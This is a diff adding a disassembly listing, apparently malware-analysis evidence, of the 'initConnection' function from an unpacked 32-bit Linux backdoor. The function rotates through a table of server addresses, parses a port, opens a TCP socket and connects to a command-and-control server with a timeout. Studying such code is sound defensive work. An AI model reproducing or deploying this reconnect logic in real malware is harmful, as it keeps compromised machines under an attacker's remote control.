@@ -1,0 +1,95 @@
+
+research/malware/native-elf-backdoor-analysis/evidence/backdoor-unpacked.elf:	file format elf32-i386
+
+Disassembly of section .text:
+
+0804e1d3 <initConnection>:
+ 804e1d3: 55                           	pushl	%ebp
+ 804e1d4: 89 e5                        	movl	%esp, %ebp
+ 804e1d6: 56                           	pushl	%esi
+ 804e1d7: 53                           	pushl	%ebx
+ 804e1d8: 81 ec 30 10 00 00            	subl	$0x1030, %esp           # imm = 0x1030
+ 804e1de: 8d 85 f4 ef ff ff            	leal	-0x100c(%ebp), %eax
+ 804e1e4: 89 c2                        	movl	%eax, %edx
+ 804e1e6: b8 00 10 00 00               	movl	$0x1000, %eax           # imm = 0x1000
+ 804e1eb: 89 44 24 08                  	movl	%eax, 0x8(%esp)
+ 804e1ef: c7 44 24 04 00 00 00 00      	movl	$0x0, 0x4(%esp)
+ 804e1f7: 89 14 24                     	movl	%edx, (%esp)
+ 804e1fa: e8 49 33 00 00               	calll	0x8051548 <memset>
+ 804e1ff: a1 c0 b3 05 08               	movl	0x805b3c0, %eax
+ 804e204: 85 c0                        	testl	%eax, %eax
+ 804e206: 74 17                        	je	0x804e21f <initConnection+0x4c>
+ 804e208: a1 c0 b3 05 08               	movl	0x805b3c0, %eax
+ 804e20d: 89 04 24                     	movl	%eax, (%esp)
+ 804e210: e8 ff 1f 00 00               	calll	0x8050214 <close>
+ 804e215: c7 05 c0 b3 05 08 00 00 00 00	movl	$0x0, 0x805b3c0
+ 804e21f: a1 10 b1 05 08               	movl	0x805b110, %eax
+ 804e224: 83 f8 03                     	cmpl	$0x3, %eax
+ 804e227: 75 0c                        	jne	0x804e235 <initConnection+0x62>
+ 804e229: c7 05 10 b1 05 08 00 00 00 00	movl	$0x0, 0x805b110
+ 804e233: eb 0b                        	jmp	0x804e240 <initConnection+0x6d>
+ 804e235: a1 10 b1 05 08               	movl	0x805b110, %eax
+ 804e23a: 40                           	incl	%eax
+ 804e23b: a3 10 b1 05 08               	movl	%eax, 0x805b110
+ 804e240: a1 10 b1 05 08               	movl	0x805b110, %eax
+ 804e245: 8b 0c 85 4c b0 05 08         	movl	0x805b04c(,%eax,4), %ecx
+ 804e24c: a1 10 b1 05 08               	movl	0x805b110, %eax
+ 804e251: 8b 1c 85 44 b0 05 08         	movl	0x805b044(,%eax,4), %ebx
+ 804e258: a1 10 b1 05 08               	movl	0x805b110, %eax
+ 804e25d: 8b 34 85 48 b0 05 08         	movl	0x805b048(,%eax,4), %esi
+ 804e264: a1 10 b1 05 08               	movl	0x805b110, %eax
+ 804e269: 8b 04 85 40 b0 05 08         	movl	0x805b040(,%eax,4), %eax
+ 804e270: ba 4d 8e 05 08               	movl	$0x8058e4d, %edx        # imm = 0x8058E4D
+ 804e275: 89 4c 24 14                  	movl	%ecx, 0x14(%esp)
+ 804e279: 89 5c 24 10                  	movl	%ebx, 0x10(%esp)
+ 804e27d: 89 74 24 0c                  	movl	%esi, 0xc(%esp)
+ 804e281: 89 44 24 08                  	movl	%eax, 0x8(%esp)
+ 804e285: 89 54 24 04                  	movl	%edx, 0x4(%esp)
+ 804e289: 8d 85 f4 ef ff ff            	leal	-0x100c(%ebp), %eax
+ 804e28f: 89 04 24                     	movl	%eax, (%esp)
+ 804e292: e8 02 aa ff ff               	calll	0x8048c99 <szprintf>
+ 804e297: a1 50 b0 05 08               	movl	0x805b050, %eax
+ 804e29c: 89 45 f4                     	movl	%eax, -0xc(%ebp)
+ 804e29f: 8d 85 f4 ef ff ff            	leal	-0x100c(%ebp), %eax
+ 804e2a5: c7 44 24 04 3a 00 00 00      	movl	$0x3a, 0x4(%esp)
+ 804e2ad: 89 04 24                     	movl	%eax, (%esp)
+ 804e2b0: e8 ab 32 00 00               	calll	0x8051560 <strchr>
+ 804e2b5: 85 c0                        	testl	%eax, %eax
+ 804e2b7: 74 3b                        	je	0x804e2f4 <initConnection+0x121>
+ 804e2b9: 8d 85 f4 ef ff ff            	leal	-0x100c(%ebp), %eax
+ 804e2bf: c7 44 24 04 3a 00 00 00      	movl	$0x3a, 0x4(%esp)
+ 804e2c7: 89 04 24                     	movl	%eax, (%esp)
+ 804e2ca: e8 91 32 00 00               	calll	0x8051560 <strchr>
+ 804e2cf: 40                           	incl	%eax
+ 804e2d0: 89 04 24                     	movl	%eax, (%esp)
+ 804e2d3: e8 04 51 00 00               	calll	0x80533dc <atol>
+ 804e2d8: 89 45 f4                     	movl	%eax, -0xc(%ebp)
+ 804e2db: 8d 85 f4 ef ff ff            	leal	-0x100c(%ebp), %eax
+ 804e2e1: c7 44 24 04 3a 00 00 00      	movl	$0x3a, 0x4(%esp)
+ 804e2e9: 89 04 24                     	movl	%eax, (%esp)
+ 804e2ec: e8 6f 32 00 00               	calll	0x8051560 <strchr>
+ 804e2f1: c6 00 00                     	movb	$0x0, (%eax)
+ 804e2f4: c7 44 24 08 00 00 00 00      	movl	$0x0, 0x8(%esp)
+ 804e2fc: c7 44 24 04 01 00 00 00      	movl	$0x1, 0x4(%esp)
+ 804e304: c7 04 24 02 00 00 00         	movl	$0x2, (%esp)
+ 804e30b: e8 c4 3a 00 00               	calll	0x8051dd4 <socket>
+ 804e310: a3 c0 b3 05 08               	movl	%eax, 0x805b3c0
+ 804e315: 8d 95 f4 ef ff ff            	leal	-0x100c(%ebp), %edx
+ 804e31b: 8b 0d c0 b3 05 08            	movl	0x805b3c0, %ecx
+ 804e321: c7 44 24 0c 1e 00 00 00      	movl	$0x1e, 0xc(%esp)
+ 804e329: 8b 45 f4                     	movl	-0xc(%ebp), %eax
+ 804e32c: 89 44 24 08                  	movl	%eax, 0x8(%esp)
+ 804e330: 89 54 24 04                  	movl	%edx, 0x4(%esp)
+ 804e334: 89 0c 24                     	movl	%ecx, (%esp)
+ 804e337: e8 0e b2 ff ff               	calll	0x804954a <connectTimeout>
+ 804e33c: 85 c0                        	testl	%eax, %eax
+ 804e33e: 75 0c                        	jne	0x804e34c <initConnection+0x179>
+ 804e340: c7 85 e4 ef ff ff 01 00 00 00	movl	$0x1, -0x101c(%ebp)
+ 804e34a: eb 0a                        	jmp	0x804e356 <initConnection+0x183>
+ 804e34c: c7 85 e4 ef ff ff 00 00 00 00	movl	$0x0, -0x101c(%ebp)
+ 804e356: 8b 85 e4 ef ff ff            	movl	-0x101c(%ebp), %eax
+ 804e35c: 81 c4 30 10 00 00            	addl	$0x1030, %esp           # imm = 0x1030
+ 804e362: 5b                           	popl	%ebx
+ 804e363: 5e                           	popl	%esi
+ 804e364: 5d                           	popl	%ebp
+ 804e365: c3                           	retl
